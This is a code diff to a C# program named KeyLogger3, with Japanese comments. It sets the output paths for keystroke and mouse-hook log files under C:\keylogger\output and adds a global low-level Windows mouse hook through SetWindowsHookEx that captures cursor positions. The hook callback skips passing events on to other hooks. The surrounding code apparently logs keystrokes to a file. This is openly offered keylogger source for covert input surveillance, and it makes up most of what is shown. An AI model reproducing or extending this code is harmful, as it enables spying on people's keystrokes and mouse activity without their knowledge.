@@ -24,7 +24,7 @@ namespace KeyLogger3
         static void Main(string[] args)
         {
             // ファイル出力パス
-            String filePath = Environment.CurrentDirectory = @"D:\keylogger\output";
+            String filePath = Environment.CurrentDirectory = @"C:\keylogger\output";
             String path1 = (filePath + @"\keystrokes.txt");
             String path2 = (filePath + @"\mousehook.txt");
 
@@ -50,10 +50,17 @@ namespace KeyLogger3
                     File.CreateText(path2);
                 }
             }
-            
+
             // 無限ループ
             while (true)
             {
+                ArtMouseHook oMouseHook = ArtMouseHook.GetInstance();
+                oMouseHook.StartMouseEvent(MouseEvent);
+                void MouseEvent(int iX, int iY)
+                {
+                    Console.Write("x=" + iX + "   y=" + iY);
+                }
+
                 // pause and let other programs get a chance to run
                 Thread.Sleep(5);
 
@@ -113,8 +120,127 @@ namespace KeyLogger3
                 }
 
             }
+
         } // main
 
+        // マウス監視
+        public class ArtMouseHook
+        {
+            //構造定義
+            public enum Stroke
+            {
+                MOVE,
+                LEFT_DOWN,
+                LEFT_UP,
+                RIGHT_DOWN,
+                RIGHT_UP,
+                MIDDLE_DOWN,
+                MIDDLE_UP,
+                WHEEL_DOWN,
+                WHEEL_UP,
+                X1_DOWN,
+                X1_UP,
+                X2_DOWN,
+                X2_UP,
+                UNKNOWN
+            }
+
+            public struct StateMouse
+            {
+                public Stroke Stroke;
+                public int X;
+                public int Y;
+                public uint Data;
+                public uint Flags;
+                public uint Time;
+                public IntPtr ExtraInfo;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct POINT
+            {
+                public int x;
+                public int y;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct MSLLHOOKSTRUCT
+            {
+                public POINT pt;
+                public uint mouseData;
+                public uint flags;
+                public uint time;
+                public System.IntPtr dwExtraInfo;
+            }
+
+            //関数定義
+            [DllImport("user32.dll")]
+            private static extern IntPtr SetWindowsHookEx(
+                int idHook,
+                MouseHookCallback lpfn,
+                IntPtr hMod,
+                uint dwThreadId);
+
+            [DllImport("user32.dll")]
+            private static extern IntPtr CallNextHookEx(
+                IntPtr hhk,
+                int nCode,
+                uint msg,
+                ref MSLLHOOKSTRUCT msllhookstruct);
+
+            private delegate IntPtr MouseHookCallback(int nCode, uint msg, ref MSLLHOOKSTRUCT msllhookstruct);
+
+            //マウスイベント
+            private event MouseHookCallback m_EventMouse;
+            private IntPtr m_Handle;
+
+            private IntPtr EventMouse(int nCode, uint msg, ref MSLLHOOKSTRUCT s) //MouseHookCallback
+            {
+                int iX = s.pt.x;
+                int iY = s.pt.y;
+                m_MouseEventDelegate(iX, iY);
+                return (IntPtr)0;
+                // return CallNextHookEx(m_Handle, nCode, msg, ref s);
+            }
+
+            //-------------------------------------
+            //-------------------------------------
+            //-------------------------------------
+
+            //インスタンスの取得
+            private static ArtMouseHook m_Instance = null;
+
+            public static ArtMouseHook GetInstance()
+            {
+                if (m_Instance == null)
+                {
+                    m_Instance = new ArtMouseHook();
+                }
+
+                return m_Instance;
+            }
+
+            //マウスイベントの開始
+            public delegate void MouseEventDelegate(int iX, int iY);
+            private MouseEventDelegate m_MouseEventDelegate = null;
+
+            public void StartMouseEvent(MouseEventDelegate oMouseEventDelegate)
+            {
+                IntPtr hInstance = Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]);
+
+                // WH_MOUSE_LL = 14
+                m_MouseEventDelegate = oMouseEventDelegate;
+                m_EventMouse = EventMouse;
+                m_Handle = SetWindowsHookEx(14, m_EventMouse, hInstance, 0);
+
+                if (m_Handle == IntPtr.Zero)
+                {
+                    //Console.WriteLine("ERROR ArtMouseHook");
+                }
+            }
+        }
+
+        // 構造体定義
         internal struct LASTINPUTINFO
         {
             public uint cbSize;
